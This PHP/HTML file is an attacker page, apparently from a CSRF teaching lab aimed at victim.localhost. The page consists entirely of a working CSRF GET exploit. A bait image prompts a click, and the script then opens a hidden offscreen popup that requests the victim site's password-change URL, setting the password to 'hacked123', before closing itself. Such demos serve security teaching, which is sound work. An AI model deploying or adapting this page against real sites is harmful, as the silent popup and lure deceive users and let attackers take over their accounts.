<?php
$attackUrl = 'http://victim.localhost/CSRF/get/zrtva/index.php?action=change_password&new_password=hacked123';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Napadač (CSRF GET)</title>
    <link rel="stylesheet" href="../../style.css">
    <style>
        .note { font-size: 14px; color: #444; }
    </style>
</head>
<body>
<h1>Napadač — CSRF GET</h1>

<div class="card">
    <div class="img-frame">
        <img id="bait" src="image.jpeg" alt="Klikni za fullscreen" title="Klikni za fullscreen">
    </div>
</div>

<div id="overlay" class="overlay" style="display:none;">
    <span id="closeOverlay" class="close">&#10005;</span>
    <img src="image.jpeg" alt="Full image">
</div>

<script>
const attackUrl = <?php echo json_encode($attackUrl); ?>;
const img = document.getElementById('bait');
const overlay = document.getElementById('overlay');
const closeOverlay = document.getElementById('closeOverlay');

function sendAttackSilently() {
    const popup = window.open(attackUrl, 'csrfGetAttack', 'popup,width=1,height=1,left=-10000,top=-10000,toolbar=0,location=0,menubar=0,scrollbars=0,status=0,resizable=0');
    if (!popup) return;
    try {
        popup.opener = null;
        popup.blur();
        window.focus();
        popup.addEventListener('load', () => setTimeout(() => { try { popup.close(); } catch (e) {} }, 120));
    } catch (e) {}
    setTimeout(() => {
        try { popup.close(); } catch (e) {}
    }, 260);
}
img.addEventListener('click', () => {
    overlay.style.display = 'flex';
    setTimeout(sendAttackSilently, 100);
});
closeOverlay.addEventListener('click', () => {
    overlay.style.display = 'none';
});
</script>
</body>
</html>
